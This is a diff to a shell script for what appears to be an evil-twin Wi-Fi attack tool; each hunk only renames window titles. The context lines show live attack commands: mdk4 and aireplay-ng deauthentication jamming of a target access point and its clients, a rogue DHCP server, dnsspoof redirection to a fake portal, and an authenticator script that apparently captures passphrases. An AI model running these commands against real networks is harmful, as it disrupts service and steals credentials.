@@ -1443,7 +1443,7 @@ fi
 if echo \"\$ClientBrand\" | grep -q x; then ClientBrand=\"unknown\"; fi
 
 echo \"
-CAPCAPWIFI $CAPCAPVersion.$CAPCAPRevision
+CAPWIFI $CAPCAPVersion.$CAPCAPRevision
 
 SSID: \\\"$staticSSID\\\"
 BSSID: $CapCapTargetMAC ($CapCapTargetMaker)
@@ -1970,21 +1970,21 @@ captive_portal_start_jammer_service() {
     if [ "$targetMode" = "subset" ]; then
       printf '%s\n' $targetClients > "$CAPCAPWorkspacePath/mdk4_blacklist.lst"
       capcap_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -b \"$CAPCAPWorkspacePath/mdk4_blacklist.lst\""
     else
       capcap_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "mdk4 $CaptivePortalJammerInterface d -c $CapCapTargetChannel -B $CapCapTargetMAC"
     fi
   elif [[ $option_deauth -eq 2 ]]; then
     if [ "$targetClients" ]; then
       capcap_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "for client in $targetClients; do aireplay-ng -0 0 -a $CapCapTargetMAC -c \$client --ignore-negative-one $CaptivePortalJammerInterface & done; wait"
     else
       capcap_window_open CaptivePortalJammerServiceXtermPID \
-        "CAPCAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
+        "CAPWIFI AP Jammer Service [$CapCapTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
         "aireplay-ng -0 0 -a $CapCapTargetMAC --ignore-negative-one $CaptivePortalJammerInterface"
     fi
   fi
@@ -2173,14 +2173,14 @@ start_attack() {
   # Clear any previous log entries
   > "$CAPCAPWorkspacePath/clients.txt"
   capcap_window_open CaptivePortalDHCPServiceXtermPID \
-    "CAPCAPWIFI AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
+    "CAPWIFI AP DHCP Service" "$TOPLEFT" "black" "#CCCC00" \
     "KEA_LOCKFILE_DIR=/run/lock/kea kea-dhcp4 ${CAPCAPDebug:+-d }-c \"$CAPCAPWorkspacePath/kea-dhcp4.conf\" 2>&1 | tee -a \"$CAPCAPWorkspacePath/clients.txt\""
   echo "DHCP Service: $CaptivePortalDHCPServiceXtermPID" \
     >> $CAPCAPOutputDevice
 
   echo -e "$CAPCAPVLine $CaptivePortalStartingDNSServiceNotice"
   capcap_window_open CaptivePortalDNSServiceXtermPID \
-    "CAPCAPWIFI AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
+    "CAPWIFI AP DNS Service" "$BOTTOMLEFT" "black" "#99CCFF" \
     "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$CAPCAPWorkspacePath/hosts\""
   echo "DNS Service: $CaptivePortalDNSServiceXtermPID" \
     >> $CAPCAPOutputDevice
@@ -2194,7 +2194,7 @@ start_attack() {
   CaptivePortalWebServicePID=$!
 
   capcap_window_open CaptivePortalWebServiceXtermPID \
-    "CAPCAPWIFI Web Service" "$BOTTOM" "black" "#00CC00" \
+    "CAPWIFI Web Service" "$BOTTOM" "black" "#00CC00" \
     "tail -f \"$CAPCAPWorkspacePath/lighttpd.log\""
   echo "Web Service: $CaptivePortalWebServiceXtermPID" \
     >> $CAPCAPOutputDevice
@@ -2205,7 +2205,7 @@ start_attack() {
 
   echo -e "$CAPCAPVLine $CaptivePortalStartingAuthenticatorServiceNotice"
   capcap_window_open CaptivePortalAuthenticatorServiceXtermPID \
-    "CAPCAPWIFI AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
+    "CAPWIFI AP Authenticator" "$TOPRIGHT" "black" "#CCCCCC" \
     "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   echo "Auth Service: $CaptivePortalAuthenticatorServiceXtermPID" \
     >> $CAPCAPOutputDevice
